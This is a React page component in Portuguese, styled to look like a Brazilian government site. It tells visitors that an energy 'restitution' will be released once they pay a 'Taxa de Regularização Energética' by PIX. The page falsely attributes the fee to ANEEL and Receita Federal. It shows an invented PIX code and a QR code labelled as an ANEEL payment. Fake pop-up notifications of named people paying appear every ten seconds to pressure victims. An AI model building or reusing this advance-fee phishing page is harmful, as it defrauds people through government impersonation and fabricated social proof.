import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Copy, CheckCircle, Info, AlertCircle, Bell } from "lucide-react";
import { Separator } from "@/components/ui/separator";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { useToast } from "@/hooks/use-toast";
import { Toast, ToastProvider } from "@/components/ui/toast";
import { playNotificationSound } from "@/components/NotificationSound";

// Gerar um código PIX aleatório
const gerarCodigoPix = () => {
  const chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  let codigo = "";
  for (let i = 0; i < 32; i++) {
    codigo += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return codigo.match(/.{1,4}/g)?.join(" ") || "";
};

// Nomes para as notificações
const nomes = [
  "Pedro", "Maria", "João", "Ana", "Carlos", "Fernanda", "Lucas", "Júlia", 
  "Rafael", "Mariana", "Bruno", "Camila", "Diego", "Isabela", "Gustavo", 
  "Letícia", "Henrique", "Amanda", "Felipe", "Natália", "Ricardo", "Larissa",
  "Rodrigo", "Carla", "Alexandre", "Beatriz", "Eduardo", "Vanessa", "Marcelo", "Bianca"
];

// Componente de notificação
interface NotificacaoProps {
  nome: string;
  valor: string;
  onClose: () => void;
}

const Notificacao = ({ nome, valor, onClose }: NotificacaoProps) => {
  useEffect(() => {
    // Som de notificação
    playNotificationSound();
    
    // Fechar automaticamente após 5 segundos
    const timer = setTimeout(() => {
      onClose();
    }, 5000);
    
    return () => clearTimeout(timer);
  }, [onClose]);
  
  return (
    <Toast className="fixed right-4 max-w-md w-full bg-white shadow-lg rounded-lg">
      <div className="flex items-start p-4">
        <div className="flex-shrink-0 pt-0.5">
          <Bell className="h-5 w-5 text-blue-500" />
        </div>
        <div className="ml-3 w-0 flex-1">
          <p className="text-sm font-medium text-gray-900">
            Nova transação
          </p>
          <p className="mt-1 text-sm text-gray-500">
            <strong>{nome}</strong> acabou de pagar a TRE para uma restituição de <strong className="text-green-600">{valor}</strong>
          </p>
        </div>
        <div className="ml-4 flex-shrink-0 flex">
          <button
            className="bg-white rounded-md inline-flex text-gray-400 hover:text-gray-500 focus:outline-none"
            onClick={onClose}
          >
            <span className="sr-only">Fechar</span>
            <svg className="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
              <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" />
            </svg>
          </button>
        </div>
      </div>
    </Toast>
  );
};

// Formatar um valor monetário
const formatarValor = (valor: number) => {
  return valor.toLocaleString('pt-BR', { 
    style: 'currency', 
    currency: 'BRL' 
  });
};

// Componente principal da página
export default function PagamentoPix() {
  const [location, navigate] = useLocation();
  const { toast } = useToast();
  
  // Obter parâmetros da URL
  const urlParams = new URLSearchParams(window.location.search);
  
  // Dados da restituição
  const cpf = urlParams.get('cpf') || "";
  const nome = urlParams.get('nome') || "";
  const valor = parseFloat(urlParams.get('valor') || "2500");
  const valorFormatado = formatarValor(valor);
  const valorTaxaFormatado = formatarValor(74.90);
  
  // Estado para o código PIX
  const [codigoPix] = useState(gerarCodigoPix());
  const [copied, setCopied] = useState(false);
  
  // Estado para as notificações
  const [notificacoes, setNotificacoes] = useState<{ id: number; nome: string; valor: string }[]>([]);
  
  // Gerar um valor aleatório para notificações
  const gerarValorAleatorio = () => {
    const valor = 1800 + Math.random() * 1200; // Entre 1800 e 3000
    return formatarValor(valor);
  };
  
  // Função para gerar uma notificação
  const gerarNotificacao = () => {
    const nomeAleatorio = nomes[Math.floor(Math.random() * nomes.length)];
    const valorAleatorio = gerarValorAleatorio();
    
    const id = Date.now();
    setNotificacoes(prev => [...prev, { id, nome: nomeAleatorio, valor: valorAleatorio }]);
  };
  
  // Remover uma notificação
  const removerNotificacao = (id: number) => {
    setNotificacoes(prev => prev.filter(notif => notif.id !== id));
  };
  
  // Copiar o código PIX
  const copiarCodigoPix = () => {
    navigator.clipboard.writeText(codigoPix.replace(/\s/g, ''));
    setCopied(true);
    toast({
      title: "Código copiado!",
      description: "O código PIX foi copiado para a área de transferência.",
    });
    
    setTimeout(() => setCopied(false), 3000);
  };
  
  // Simular o pagamento (para fins de demonstração)
  const simularPagamento = () => {
    navigate("/sucesso");
  };
  
  // Gerar notificações a cada 10 segundos
  useEffect(() => {
    // Gerar as 10 notificações iniciais
    const gerarNotificacoesIniciais = () => {
      for (let i = 0; i < 10; i++) {
        setTimeout(() => {
          gerarNotificacao();
        }, i * 10000); // A cada 10 segundos
      }
    };
    
    gerarNotificacoesIniciais();
    
    // Continuar gerando notificações a cada 10 segundos
    const interval = setInterval(() => {
      gerarNotificacao();
    }, 10000);
    
    return () => clearInterval(interval);
  }, []);
  
  return (
    <main className="container mx-auto px-4 py-8">
      <div className="max-w-3xl mx-auto">
        <h1 className="text-3xl font-bold text-[var(--gov-blue-dark)] mb-6">
          Pagamento da Taxa de Regularização Energética (TRE)
        </h1>
        
        <div className="mb-6">
          <Alert className="bg-yellow-50 border-yellow-200">
            <AlertCircle className="h-4 w-4 text-yellow-600" />
            <AlertTitle className="text-yellow-800">Etapa final para receber sua restituição</AlertTitle>
            <AlertDescription className="text-yellow-700">
              Para liberar o crédito da sua restituição de <strong>{valorFormatado}</strong>, é necessário o pagamento da Taxa de Regularização Energética (TRE).
            </AlertDescription>
          </Alert>
        </div>
        
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          <div className="md:col-span-2">
            <Card>
              <CardContent className="p-6">
                <h2 className="text-xl font-semibold mb-4">Informações da Restituição</h2>
                
                <div className="space-y-4">
                  <div>
                    <p className="text-gray-500 text-sm">CPF</p>
                    <p className="font-medium">{cpf}</p>
                  </div>
                  
                  <div>
                    <p className="text-gray-500 text-sm">Nome</p>
                    <p className="font-medium">{nome}</p>
                  </div>
                  
                  <div>
                    <p className="text-gray-500 text-sm">Valor a Receber</p>
                    <p className="font-medium text-xl text-green-600">{valorFormatado}</p>
                  </div>
                  
                  <Separator />
                  
                  <div>
                    <p className="text-gray-500 text-sm">Taxa de Regularização Energética (TRE)</p>
                    <p className="font-medium text-orange-600">{valorTaxaFormatado}</p>
                  </div>
                </div>
                
                <div className="mt-6 bg-blue-50 p-4 rounded-lg">
                  <div className="flex">
                    <Info className="h-5 w-5 text-blue-600 mt-0.5" />
                    <div className="ml-3">
                      <h3 className="text-blue-800 font-medium">O que é a Taxa de Regularização Energética (TRE)?</h3>
                      <p className="text-blue-700 text-sm mt-1">
                        A Taxa de Regularização Energética (TRE) é uma exigência legal imposta pelos órgãos governamentais, como a ANEEL e a Receita Federal. Essa taxa cobre os custos operacionais, administrativos e de auditorias necessários para a liberação segura e oficial do seu crédito de <strong>{valorFormatado}</strong>.
                      </p>
                    </div>
                  </div>
                </div>
                
                <div className="mt-4 space-y-4">
                  <div className="border border-gray-200 rounded-lg p-4">
                    <h3 className="font-medium">Após o pagamento, quanto tempo leva para receber a restituição?</h3>
                    <p className="text-gray-600 text-sm mt-1">
                      Após a confirmação do pagamento, seu crédito será liberado e depositado em sua conta bancária em até 72h úteis.
                    </p>
                  </div>
                  
                  <div className="border border-gray-200 rounded-lg p-4">
                    <h3 className="font-medium">Esse processo é seguro?</h3>
                    <p className="text-gray-600 text-sm mt-1">
                      Sim. Todo o procedimento é regulamentado e fiscalizado pela ANEEL e pela Receita Federal, garantindo a segurança e a transparência na liberação dos valores de <strong>{valorFormatado}</strong> a que você tem direito.
                    </p>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
          
          <div>
            <Card>
              <CardContent className="p-6">
                <h2 className="text-xl font-semibold mb-4">Pagamento via PIX</h2>
                
                <Tabs defaultValue="qrcode">
                  <TabsList className="w-full mb-4">
                    <TabsTrigger value="qrcode" className="flex-1">QR Code</TabsTrigger>
                    <TabsTrigger value="copiacola" className="flex-1">Copia e Cola</TabsTrigger>
                  </TabsList>
                  
                  <TabsContent value="qrcode" className="mt-2">
                    <div className="flex flex-col items-center justify-center">
                      <div className="border border-gray-200 p-4 rounded-lg mb-4">
                        <img 
                          src="https://chart.googleapis.com/chart?cht=qr&chl=00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426655440000%235204000053039865802BR5913ANEEL%20PAGTOS6008BRASILIA62070503***6304DA5A&chs=200x200&chld=L|0"
                          alt="QR Code do PIX" 
                          className="w-44 h-44" 
                        />
                      </div>
                      <p className="text-sm text-gray-600 mb-2">Valor a ser pago:</p>
                      <p className="text-xl font-bold">{valorTaxaFormatado}</p>
                    </div>
                  </TabsContent>
                  
                  <TabsContent value="copiacola" className="mt-2">
                    <div>
                      <p className="text-sm text-gray-600 mb-2">Copie o código abaixo:</p>
                      <div className="flex items-center">
                        <div className="flex-1 bg-gray-100 p-3 rounded-l-md font-mono text-xs break-all">
                          {codigoPix}
                        </div>
                        <button 
                          onClick={copiarCodigoPix}
                          className="bg-[var(--gov-blue)] text-white p-3 rounded-r-md hover:bg-[var(--gov-blue-dark)]"
                        >
                          {copied ? <CheckCircle className="h-5 w-5" /> : <Copy className="h-5 w-5" />}
                        </button>
                      </div>
                      <p className="text-sm text-gray-600 mt-4 mb-2">Valor a ser pago:</p>
                      <p className="text-xl font-bold">{valorTaxaFormatado}</p>
                    </div>
                  </TabsContent>
                </Tabs>
                
                <div className="mt-6">
                  <Button 
                    onClick={simularPagamento}
                    className="w-full bg-[var(--gov-green)] hover:bg-[var(--gov-green)]/90 text-white font-bold py-3"
                  >
                    Já fiz o pagamento
                  </Button>
                  
                  <p className="text-xs text-gray-500 text-center mt-2">
                    Clique apenas após concluir o pagamento
                  </p>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
      
      {/* Notificações */}
      <div className="fixed top-4 right-4 z-50 flex flex-col space-y-2">
        {notificacoes.map(notif => (
          <Notificacao 
            key={notif.id}
            nome={notif.nome}
            valor={notif.valor}
            onClose={() => removerNotificacao(notif.id)}
          />
        ))}
      </div>
    </main>
  );
}